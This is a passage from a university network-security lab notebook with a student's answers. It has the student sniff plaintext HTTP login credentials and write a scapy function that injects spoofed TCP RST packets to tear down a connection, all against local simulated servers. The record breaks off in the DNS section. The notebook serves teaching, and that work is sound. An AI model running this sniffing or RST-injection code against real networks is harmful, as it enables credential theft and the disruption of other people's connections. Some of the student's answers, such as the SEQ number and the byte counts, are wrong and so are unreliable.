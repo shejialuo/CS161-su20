{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# CS 161: Network Security Lab\n",
    "v1.0 Shomil Jain."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Hey! Welcome to the world of network security. In this lab, you'll have a chance to apply some of the concepts you've learned over the past few week. This lab has two parts.\n",
    "1. **Part 1:** Coffee Shop Attacks [TCP/IP, TLS]\n",
    "2. **Part 2:** Other Networking Topics [DNS, DNSSec]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "***"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**<h3>This lab also requires you to be a root user on your local computer.</h3>**\n",
    "If you didn't launch this notebook as root , quit & re-launch the notebook using the following command: `sudo jupyter notebook --allow-root`"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "---\n",
    "\n",
    "# Environment Setup\n",
    "\n",
    "This lab requires the Python `flask`, `scapy`, and `requests` modules. `scapy` should work out-of-the-box for MacOS; if you're using a Linux or Windows device, you may need to follow additional platform-specific versions available [here](https://scapy.readthedocs.io/en/latest/installation.html#platform-specific-instructions), such as installing `tcpdump`, if applicable. If you're unable to get `scapy` working, please check the [FAQ's](https://docs.google.com/document/d/1FWNH1TqVD9aXqfcGrbE6o0xaJEuPrjQMhgPJMuQ5oLM/edit) or make a Piazza post!\n",
    "<br>\n",
    "<br>\n",
    "**Run the following code block to install the required modules:**"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Requirement already satisfied: flask in /usr/lib/python3.10/site-packages (2.1.2)\r\n",
      "Requirement already satisfied: scapy in /usr/lib/python3.10/site-packages (2.4.5)\r\n",
      "Requirement already satisfied: requests in /usr/lib/python3.10/site-packages (2.27.1)\r\n",
      "Requirement already satisfied: Werkzeug>=2.0 in /usr/lib/python3.10/site-packages (from flask) (2.1.2)\r\n",
      "Requirement already satisfied: Jinja2>=3.0 in /usr/lib/python3.10/site-packages (from flask) (3.1.2)\r\n",
      "Requirement already satisfied: itsdangerous>=2.0 in /usr/lib/python3.10/site-packages (from flask) (2.1.2)\r\n",
      "Requirement already satisfied: click>=8.0 in /usr/lib/python3.10/site-packages (from flask) (8.1.3)\r\n",
      "Requirement already satisfied: MarkupSafe>=2.0 in /usr/lib/python3.10/site-packages (from Jinja2>=3.0->flask) (2.1.1)\r\n",
      "Requirement already satisfied: chardet>=3.0.2 in /usr/lib/python3.10/site-packages (from requests) (4.0.0)\r\n",
      "Requirement already satisfied: idna>=2.5 in /usr/lib/python3.10/site-packages (from requests) (3.3)\r\n",
      "Requirement already satisfied: urllib3>=1.21.1 in /usr/lib/python3.10/site-packages (from requests) (1.26.9)\r\n"
     ]
    }
   ],
   "source": [
    "!pip install flask scapy requests"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Network Interface\n",
    "This lab simulates connections between a client & server running on your local interface. The default values for these are in the comments below, but your specific `loopback` / `LAN` interface might be different. Try the values specified below, but if they don't work, refer to the [FAQ's](https://docs.google.com/document/d/1FWNH1TqVD9aXqfcGrbE6o0xaJEuPrjQMhgPJMuQ5oLM/edit?usp=sharing) or make a Piazza Post."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [],
   "source": [
    "# TODO: Set the value below based on your platform.\n",
    "\n",
    "# MacOS: 'lo0'\n",
    "# Linux: 'lo'\n",
    "# Windows: 'Run ipconfig / all in a terminal window & copy your Wireless LAN Interface description value here.'\n",
    "\n",
    "NETWORK_INTERFACE = 'lo'"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "To test if scapy is set up correctly, run the following cells. If you see an error, your network interface might be incorrect, or you might need to re-run this notebook as a root user (`sudo jupyter notebook`)."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "/usr/lib/python3.10/site-packages/scapy/layers/ipsec.py:471: CryptographyDeprecationWarning: Blowfish has been deprecated\n",
      "  cipher=algorithms.Blowfish,\n",
      "/usr/lib/python3.10/site-packages/scapy/layers/ipsec.py:485: CryptographyDeprecationWarning: CAST5 has been deprecated\n",
      "  cipher=algorithms.CAST5,\n"
     ]
    }
   ],
   "source": [
    "from scapy.all import *"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<Sniffed: TCP:1 UDP:0 ICMP:0 Other:0>"
      ]
     },
     "execution_count": 4,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sniff(iface=NETWORK_INTERFACE, count=1)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**If you see `<Sniffed: ...>` above, you're ready to proceed!**"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "If you see an error, either try doing a quick Google Search to diagnose your problem, or make a Piazza post with details about your system (i.e. Mac/Windows/Linux)."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "***"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Part 1: Coffee Shop Attacks"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Preface\n",
    "\n",
    "Imagine you're sitting at a coffee shop. You connect to the coffee shop's public, shared WiFi network. You notice that EvanBot is also at the coffee shop – and connected to the same network. We'd like to explore the following questions:\n",
    "- How much of EvanBot's browsing activity can we monitor by simply being on the same WiFi network? \n",
    "- Can we interrupt his activity in any way?\n",
    "- What can EvanBot do to protect himself?"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Quick Review: Packets\n",
    "\n",
    "A **Network Packet** is an atomic unit of structured communication. Packets contain a **Header** and a **Payload**.\n",
    "\n",
    "\n",
    "The protocols for sending information over the internet follow a layered structure. Our interpretation of these layers closely follows the [OSI 7-Layer Model](https://en.wikipedia.org/wiki/OSI_model). The three layers that we're going to explore in this lab are the Application Layer, the Transport Layer, and the Network Layer.\n",
    "- **Application Layer**: the human-readable context you want to send (i.e. HTML, JSON, etc.)\n",
    "- **Transport Layer**: this creates an end-to-end connection between the source & destination servers (i.e. UDP, TCP)\n",
    "- **Network Layer**: this finds routes through the internet to actually send messages (i.e. IP)\n",
    "\n",
    "<img style=\"float: left;\" src=\"images/layers.png\" width=\"250\">"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Quick Review: HTTP"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "\n",
    "**HTTP (Hypertext Transfer Protocol)** is an Application Layer protocol that websites and apps use to communicate with servers and databases. Just like the other layers, HTTP Packets are encapsulated in the layer below – the Transport layer. They also have headers and (optionally) payloads – check out the examples below.\n",
    "\n",
    "#### GET Requests are used to request data from a server.\n",
    "```\n",
    "GET / HTTP/1.1\n",
    "Host: squigler.com\n",
    "Dnt: 1\n",
    "```\n",
    "\n",
    "#### POST Requests are used to upload data to a server.\n",
    "```\n",
    "POST /login HTTP/1.1\n",
    "Host: squigler.com\n",
    "Content-Length: 40\n",
    "Content-Type: application/x-url-formencoded\n",
    "Dnt: 1\n",
    "\n",
    "{\"username\": \"Alice\", \"password\": \"1234\"}\n",
    "```\n",
    "\n",
    "In the first example, the GET Request contains an empty payload; all the information needed to process the request is in the header. In the second example, the POST Request contains a JSON (dictionary) payload. "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Attack #1: Sniff Insecure Network Traffic"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "EvanBot decides to log in to his CalCentral Account at http://calcentral.berkeley.edu. Can we see his username and password? **Note: he's using HTTP, not HTTPS. Why does that matter?**\n",
    "<br/>\n",
    "<br/>\n",
    "When EvanBot submits his login information via CalCentral, his browser makes a POST Request to http://calcentral.berkeley.edu/api/login with his username and password attached in the data payload. Take a look at the client-side logic (runs on EvanBot's browser) and the server-side logic (runs on the CalCentral server) below.\n",
    "***\n",
    "### Client-Side Logic\n",
    "```Python\n",
    "def handle_login_button_clicked():\n",
    "    # Make a POST Request to CalCentral, containing the entered username/password.\n",
    "    success = requests.post('http://calcentral.berkeley.edu/api/login', \n",
    "                            data=json.dumps({\n",
    "                                'username': page.get('username'),\n",
    "                                'password': page.get('password')\n",
    "                            })).json()\n",
    "    \n",
    "    # Check the value of the response.\n",
    "    if success.get('success') == True:\n",
    "        print(\"Login completed successfully!\")\n",
    "    else:\n",
    "        print(\"Username or password was incorrect.\")\n",
    "```\n",
    "***\n",
    "### Server-Side Logic\n",
    "```Python\n",
    "# Handle the POST Request on the server.\n",
    "@app.route('/api/login', methods=['POST'])\n",
    "def login_user():\n",
    "    username = request.form.get('username', '')\n",
    "    password = request.form.get('password', '')\n",
    "    \n",
    "    # Check if evanbot's username and password are valid.\n",
    "    if username == 'HIDDEN' and password == 'HIDDEN':\n",
    "        success = True\n",
    "    else:\n",
    "        success = False\n",
    "        \n",
    "    return success\n",
    "```\n",
    "***"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Simulate a Login Event & Capture Packets"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "In this attack, our goal is to simulate an on-path attacker. We're going to wait for EvanBot to log in - and then try to steal his login credentials, which are sent as plaintext over the insecure TCP connection."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**Instructions:**\n",
    "Open up two terminal windows. We'll refer to them as **T1** and **T2**. In both windows, change directory to the attack1 folder (`cd attack1`).\n",
    "\n",
    "_(If you're using a virtual environment, make sure both windows also run in the same environment)_\n",
    "\n",
    "1. **In Notebook**: Start sniffing for packets by running the cell below.\n",
    "2. **In T1**: start the web server by running `python app.py --port 1616`\n",
    "3. **In T2**: Simulate a login event by running `python login.py --port 1616` (in a separate terminal window)\n",
    "4. After packets show up in this cell's output, stop the cell and proceed!"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Starting network sniffing. Now, simulate a login event.\n",
      "Collected 1 packets.\n",
      "Collected 2 packets.\n",
      "Collected 3 packets.\n",
      "Collected 4 packets.\n",
      "Collected 5 packets.\n",
      "Collected 6 packets.\n",
      "Collected 7 packets.\n",
      "Collected 8 packets.\n",
      "Collected 9 packets.\n",
      "Collected 10 packets.\n",
      "Collected 11 packets.\n",
      "Collected 12 packets.\n",
      "Collected 13 packets.\n",
      "Collected 14 packets.\n",
      "Collected 15 packets.\n",
      "Collected 16 packets.\n",
      "Collected 17 packets.\n",
      "Collected 18 packets.\n",
      "Collected 19 packets.\n",
      "Collected 20 packets.\n",
      "Collected 21 packets.\n",
      "Collected 22 packets.\n",
      "Collected 23 packets.\n",
      "Collected 24 packets.\n",
      "Collected 25 packets.\n",
      "Collected 26 packets.\n",
      "Collected 27 packets.\n",
      "Collected 28 packets.\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "<Sniffed: TCP:28 UDP:0 ICMP:0 Other:0>"
      ]
     },
     "execution_count": 5,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# After following the instructions above, you should see several \n",
    "# packets show up underneath this cell\n",
    "\n",
    "packets = []\n",
    "\n",
    "def print_packet(packet):\n",
    "    global packets\n",
    "    packets.append(packet)\n",
    "    print(f'Collected {len(packets)} packets.')\n",
    "\n",
    "print(\"Starting network sniffing. Now, simulate a login event.\")\n",
    "sniff(filter=\"port 1616\", prn=print_packet, iface=NETWORK_INTERFACE)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "***\n",
    "## 1.1\n",
    "* **How many TCP packets did you collect in one simulated login event? UDP packets?**\n",
    "* **How many packets contained payloads? (A packet that contains a Payload has a \"Raw\" layer.**\n",
    "* **How many bytes did the server send to the client?**\n",
    "* **How many bytes did the client send to the server?**\n",
    "\n",
    "Note: you can access the packets sniffed above using the `packets` array. Use `packet.summary()` to see a summary of the packet.\n",
    "\n",
    "_Hint: The python `len` function returns the total size (# bytes) of a packet._\n",
    "<br>\n",
    "_Hint: to differentiate server & client, look at the HTTP Payloads, or consider which of the two initiated the connection._\n",
    "***"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "(28, 0, 8, 1366, 1366)\n"
     ]
    }
   ],
   "source": [
    "# TODO: YOUR CODE HERE [to answer Checkpoint Question 1.1]\n",
    "def answer_1():\n",
    "    tcp_num, udp_num = 0, 0\n",
    "    payloads_num = 0\n",
    "    server_bytes, client_bytes = 0, 0\n",
    "    isClient = True\n",
    "    for packet in packets:\n",
    "        if packet.summary().find(\"TCP\") != -1:\n",
    "            tcp_num += 1\n",
    "        if packet.summary().find(\"UDP\") != -1:\n",
    "            udp_num += 1\n",
    "        if packet.summary().find(\"Raw\") != -1:\n",
    "            payloads_num += 1\n",
    "        if isClient:\n",
    "            client_bytes += len(packet)\n",
    "        else:\n",
    "            server_bytes += len(packet)\n",
    "        isClient = not isClient\n",
    "\n",
    "    return tcp_num, udp_num, payloads_num, server_bytes, client_bytes\n",
    "\n",
    "print(answer_1())"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**<span style = \"color: red\">(YOUR ANSWERS HERE)</span>**"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "+ 28, 0\n",
    "+ 8\n",
    "+ 1366 bytes\n",
    "+ 1366 bytes"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 1.2\n",
    "Take a closer look at the first packet (hint: use `packet.show()` to show the structure of the packet).\n",
    "* **What is the TTL of this packet?**\n",
    "* **What are the source & destination addresses of the IP layer?**\n",
    "* **What is the SEQ and ACK numbers of the TCP layer?**\n",
    "***"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "###[ Ethernet ]### \n",
      "  dst       = 00:00:00:00:00:00\n",
      "  src       = 00:00:00:00:00:00\n",
      "  type      = IPv4\n",
      "###[ IP ]### \n",
      "     version   = 4\n",
      "     ihl       = 5\n",
      "     tos       = 0x0\n",
      "     len       = 60\n",
      "     id        = 12622\n",
      "     flags     = DF\n",
      "     frag      = 0\n",
      "     ttl       = 64\n",
      "     proto     = tcp\n",
      "     chksum    = 0xb6c\n",
      "     src       = 127.0.0.1\n",
      "     dst       = 127.0.0.1\n",
      "     \\options   \\\n",
      "###[ TCP ]### \n",
      "        sport     = 41938\n",
      "        dport     = netbill_prod\n",
      "        seq       = 1092104713\n",
      "        ack       = 0\n",
      "        dataofs   = 10\n",
      "        reserved  = 0\n",
      "        flags     = S\n",
      "        window    = 65495\n",
      "        chksum    = 0xfe30\n",
      "        urgptr    = 0\n",
      "        options   = [('MSS', 65495), ('SAckOK', b''), ('Timestamp', (1373407581, 0)), ('NOP', None), ('WScale', 7)]\n",
      "\n"
     ]
    }
   ],
   "source": [
    "# TODO: YOUR CODE HERE [to answer Checkpoint Question 1.2]\n",
    "def answer_2():\n",
    "    packets[0].show()\n",
    "answer_2()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**<span style = \"color: red\">(YOUR ANSWERS HERE)</span>**"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "+ 64\n",
    "+ 127.0.0.1, 127.0.0.1\n",
    "+ 652853333, 0"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Extract the Payload and Response from this TCP Connection\n",
    "Up to this point, we've analyzed the Network (IP) and Transport (TCP) layers. In order to extract EvanBot's login credentials, we need to analyze the Application (HTTP) layer.\n",
    "\n",
    "This layer is contained within the payload of a handful of packets within the TCP sequence. After the TCP connection is established, the HTTP Layer can send and receive data through the payload of the TCP connection. In our packet structure, this shows up as the \"Raw\" payloads."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "***\n",
    "## 1.3\n",
    "Find the packet that contains EvanBot's username and password. \n",
    "\n",
    "*Hint: use packet.show() to show the structure of the packet. Look at the RAW (payload) section of the packet, if it exists. Not all packets contain payloads. To print the payload, use `packet[TCP].payload`.*\n",
    "\n",
    "* **What user agent did the HTTP request originate from?**\n",
    "* **What are EvanBot's username and password?**\n",
    "* **Were the username/password combination correct?**\n",
    "* **This attack wouldn't work if Evanbot was using HTTPS. Why?**\n",
    "* **This attack wouldn't work if we weren't on-path. Why?**\n",
    "***"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<IP  version=4 ihl=5 tos=0x0 len=231 id=12624 flags=DF frag=0 ttl=64 proto=tcp chksum=0xabf src=127.0.0.1 dst=127.0.0.1 |<TCP  sport=41938 dport=netbill_prod seq=1092104714 ack=4060254957 dataofs=8 reserved=0 flags=PA window=512 chksum=0xfedb urgptr=0 options=[('NOP', None), ('NOP', None), ('Timestamp', (1373407582, 1373407581))] |<Raw  load='POST /api/login HTTP/1.1\\r\\nHost: 127.0.0.1:1616\\r\\nUser-Agent: python-requests/2.27.1\\r\\nAccept-Encoding: gzip, deflate, br\\r\\nAccept: */*\\r\\nConnection: keep-alive\\r\\nContent-Length: 48\\r\\n\\r\\n' |>>><IP  version=4 ihl=5 tos=0x0 len=231 id=12624 flags=DF frag=0 ttl=64 proto=tcp chksum=0xabf src=127.0.0.1 dst=127.0.0.1 |<TCP  sport=41938 dport=netbill_prod seq=1092104714 ack=4060254957 dataofs=8 reserved=0 flags=PA window=512 chksum=0xfedb urgptr=0 options=[('NOP', None), ('NOP', None), ('Timestamp', (1373407582, 1373407581))] |<Raw  load='POST /api/login HTTP/1.1\\r\\nHost: 127.0.0.1:1616\\r\\nUser-Agent: python-requests/2.27.1\\r\\nAccept-Encoding: gzip, deflate, br\\r\\nAccept: */*\\r\\nConnection: keep-alive\\r\\nContent-Length: 48\\r\\n\\r\\n' |>>><IP  version=4 ihl=5 tos=0x0 len=100 id=12625 flags=DF frag=0 ttl=64 proto=tcp chksum=0xb41 src=127.0.0.1 dst=127.0.0.1 |<TCP  sport=41938 dport=netbill_prod seq=1092104893 ack=4060254957 dataofs=8 reserved=0 flags=PA window=512 chksum=0xfe58 urgptr=0 options=[('NOP', None), ('NOP', None), ('Timestamp', (1373407582, 1373407582))] |<Raw  load='{\"username\": \"evanbot\", \"password\": \"bot>human\"}' |>>><IP  version=4 ihl=5 tos=0x0 len=100 id=12625 flags=DF frag=0 ttl=64 proto=tcp chksum=0xb41 src=127.0.0.1 dst=127.0.0.1 |<TCP  sport=41938 dport=netbill_prod seq=1092104893 ack=4060254957 dataofs=8 reserved=0 flags=PA window=512 chksum=0xfe58 urgptr=0 options=[('NOP', None), ('NOP', None), ('Timestamp', (1373407582, 1373407582))] |<Raw  load='{\"username\": \"evanbot\", \"password\": \"bot>human\"}' |>>><IP  version=4 ihl=5 tos=0x0 len=217 id=45285 flags=DF frag=0 ttl=64 proto=tcp chksum=0x8b37 src=127.0.0.1 dst=127.0.0.1 |<TCP  sport=netbill_prod dport=41938 seq=4060254957 ack=1092104941 dataofs=8 reserved=0 flags=PA window=512 chksum=0xfecd urgptr=0 options=[('NOP', None), ('NOP', None), ('Timestamp', (1373407583, 1373407582))] |<Raw  load='HTTP/1.1 200 OK\\r\\nServer: Werkzeug/2.1.2 Python/3.10.5\\r\\nDate: Sat, 18 Jun 2022 12:27:11 GMT\\r\\nContent-Type: application/json\\r\\nContent-Length: 34\\r\\nConnection: close\\r\\n\\r\\n' |>>><IP  version=4 ihl=5 tos=0x0 len=217 id=45285 flags=DF frag=0 ttl=64 proto=tcp chksum=0x8b37 src=127.0.0.1 dst=127.0.0.1 |<TCP  sport=netbill_prod dport=41938 seq=4060254957 ack=1092104941 dataofs=8 reserved=0 flags=PA window=512 chksum=0xfecd urgptr=0 options=[('NOP', None), ('NOP', None), ('Timestamp', (1373407583, 1373407582))] |<Raw  load='HTTP/1.1 200 OK\\r\\nServer: Werkzeug/2.1.2 Python/3.10.5\\r\\nDate: Sat, 18 Jun 2022 12:27:11 GMT\\r\\nContent-Type: application/json\\r\\nContent-Length: 34\\r\\nConnection: close\\r\\n\\r\\n' |>>><IP  version=4 ihl=5 tos=0x0 len=86 id=45286 flags=DF frag=0 ttl=64 proto=tcp chksum=0x8bb9 src=127.0.0.1 dst=127.0.0.1 |<TCP  sport=netbill_prod dport=41938 seq=4060255122 ack=1092104941 dataofs=8 reserved=0 flags=PA window=512 chksum=0xfe4a urgptr=0 options=[('NOP', None), ('NOP', None), ('Timestamp', (1373407583, 1373407583))] |<Raw  load='{\"success\":\"Incorrect password!\"}\\n' |>>><IP  version=4 ihl=5 tos=0x0 len=86 id=45286 flags=DF frag=0 ttl=64 proto=tcp chksum=0x8bb9 src=127.0.0.1 dst=127.0.0.1 |<TCP  sport=netbill_prod dport=41938 seq=4060255122 ack=1092104941 dataofs=8 reserved=0 flags=PA window=512 chksum=0xfe4a urgptr=0 options=[('NOP', None), ('NOP', None), ('Timestamp', (1373407583, 1373407583))] |<Raw  load='{\"success\":\"Incorrect password!\"}\\n' |>>>\n"
     ]
    }
   ],
   "source": [
    "# TODO: YOUR CODE HERE [to answer Checkpoint Question 1.3]\n",
    "def answer_3():\n",
    "    info = \"\"\n",
    "    for packet in packets:\n",
    "        if packet.summary().find(\"Raw\") != -1:\n",
    "            info += repr(packet.payload)\n",
    "    \n",
    "    return info\n",
    "print(answer_3())"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**<span style = \"color: red\">(YOUR ANSWERS HERE)</span>**"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "+ User-Agent: python-requests/2.27.1.\n",
    "+ {\"username\": \"evanbot\", \"password\": \"bot>human\"}.\n",
    "+ Due to {\"success\":\"Incorrect password!\"}, the combination were not correct.\n",
    "+ Because HTTPS would encrypt the message, we don't have the key.\n",
    "+ Because we need to capture the packet, so we must be on-path."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "\n",
    "# Attack #2: Perform a RST Injection Attack"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Congratulations, you're now officially an on-path attacker! You were able to observe a login event occurring over HTTP without alerting either party of your malicious actions.\n",
    "\n",
    "In this section, we're going to take your hacking skills one step further. It's time to simulate a **RST Injection Attack**! \n",
    "\n",
    "### Background\n",
    "Assume Alice and Bob are communicating over a TCP connection. For every data packet that Alice sends to Bob, Bob replies with a packet with the **ACK** flag set. This indicates a successful acknowledgement of recieving the packet. If Alice doesn't recieve the **ACK**, she can re-send the packet over and over again (to a certain limit) until Bob recieves it and acknowledges it with an **ACK**.  \n",
    "\n",
    "To terminate a TCP connection, either party can send a TCP packet with the **RST ('R')** flag set. If the sequence number of the **RST** is valid, then the connection will be terminated immediately.\n",
    "\n",
    "Examples of groups that have used this technique include:\n",
    "- China (the Great Firewall)\n",
    "- Comcast (to block BitTorrent uploads)\n",
    "- Some intrusion detection systems, to mitigate attacks in progress"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "***\n",
    "## 1.4\n",
    "* **What information do we need to know or guess in order to perform a RST Injection Attack?**\n",
    "***"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**<span style = \"color: red\">(YOUR ANSWERS HERE)</span>**"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "+ We need to know or guess one of the sequence number"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Simulate an Active TCP Connection + Inject a RST Packet"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "In this section, we're going to walk through performing a RST Injection Attack by observing communication on a webserver and injecting RST packets to terminate the connection."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**Instructions:**\n",
    "1. Change directory to the attack2 folder (`cd attack2`)\n",
    "2. In T1, start the web server by running `python server.py --port 2020`\n",
    "3. In T2, start the client simulation by running `python client.py --port 2020` (in a separate terminal window)\n",
    "4. Proceed below.\n",
    "\n",
    "_(If you're using a virtual environment, make sure both windows also run in the same environment)_\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Construct the Attack"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "In this attack, we have an active TCP connection to the web server running on port 2020. Our goal, as an on-path attacker, is to construct a packet injection function that responds to any sniffed packets by injecting a packet with the RST Flag set."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Fill out the appropriate segments below to proceed."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [],
   "source": [
    "# TODO: Fill out the appropriate fields below.\n",
    "conf.L3socket = L3RawSocket\n",
    "\n",
    "def inject_packet(packet):\n",
    "    \"\"\"\n",
    "    This is a 'callback' - it's a function that's called as soon as we intercept a packet.\n",
    "    Our goal is to execute a RST Injection Attack on this connection by injecting a malicious packet.\n",
    "    \n",
    "    Hint: you will need to use these values when constructing your spoofed packet.\n",
    "    \n",
    "    - packet[IP].src\n",
    "    - packet[IP].dst\n",
    "    - packet[TCP].sport\n",
    "    - packet[TCP].dport\n",
    "    - packet[TCP].seq\n",
    "    - packet[TCP].ack\n",
    "    \n",
    "    \"\"\"\n",
    "    \n",
    "    if packet[IP].dst == 2020:\n",
    "        return\n",
    "    \n",
    "    # Construct the IP Layer and the TCP Layer.\n",
    "    ip_layer = IP(src=packet[IP].dst, \n",
    "                  dst=packet[IP].src)\n",
    "\n",
    "    tcp_layer = TCP(sport=packet[TCP].dport, \n",
    "                    dport=packet[TCP].sport, \n",
    "                    flags='R', \n",
    "                    window=512, \n",
    "                    seq=packet[TCP].ack)\n",
    "\n",
    "    # Enclose the TCP Layer within an IP Layer.\n",
    "    response_packet = ip_layer / tcp_layer\n",
    "    \n",
    "    # Send the packet.\n",
    "    send(response_packet, verbose=0, iface=NETWORK_INTERFACE)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "After you run the cell below, go to the terminal window that you were running the `server.py` file in. You should see a `BrokenPipeError` indicating the connection was terminated. If you don't see that, then you might have to tweak the values of your setup."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [],
   "source": [
    "packets = sniff(filter=\"port 2020\", prn=inject_packet, iface=NETWORK_INTERFACE, count=20)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "***\n",
    "## 1.5\n",
    "* **What was the code printed when you terminated the connection? (This makes sure you actually successfully performed the RST Injection Attack).**\n",
    "* **Would an off-path attacker be able to perform a RST Injection Attack?**\n",
    "* **Would a RST Injection Attack work on HTTPS traffic?**\n",
    "***"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**<span style = \"color: red\">(YOUR ANSWERS HERE)</span>**"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "+ Errno 104 Connection reset by peer\n",
    "+ Off-path attacker can do blind-spoofing\n",
    "+ Yes, tls works up the HTTP"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Part 2: Other Networking Topics"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "This part requires the `dig` command-line tool in order to work properly. It comes built in on MacOS and Linux, but if you're on Windows, you may need to install it [here](https://help.dyn.com/how-to-use-binds-dig-tool/). If you're having issues, please make a Piazza post!"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Quick Review: DNS"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The Internet is commonly indexed in two different ways. Humans refer to websites using human-readable names such as http://google.com and http://eecs.berkeley.edu, while computers refer to websites using IP addresses such as `172.217.4.174` and `23.195.69.108`. DNS, or the Domain Name System, is the protocol that translates between the two.\n",
    "\n",
    "Your local computer usually delegates the task of DNS lookups to a **DNS Recursive Resolver**, which sends the queries, processes the responses, and maintains an internal cache of records. When performing a lookup, the **DNS Stub Resolver** on your computer sends a query to the recursive resolver, lets it do all the work, and receives the response. The recursive resolver is usually provided by your ISP and/or configured into your network connection by DHCP.\n",
    "\n",
    "The **DNS Authority Servers** or name servers are servers on the Internet responsible for answering DNS queries. There is a special set of authority servers, the root servers, that are publicly known - you can see them for yourself here."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Sniff DNS Lookup"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "To start, we're going to take a look at the structure of a DNS Lookup. Run the cell below, and run `dig eecs.berkeley.edu` immediately after in a terminal window. You should see two packets printed below: a DNS Query, and a DNS Answer. "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {
    "scrolled": false
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Ether / IP / UDP / DNS Qry \"b'eecs.berkeley.edu.'\" \n",
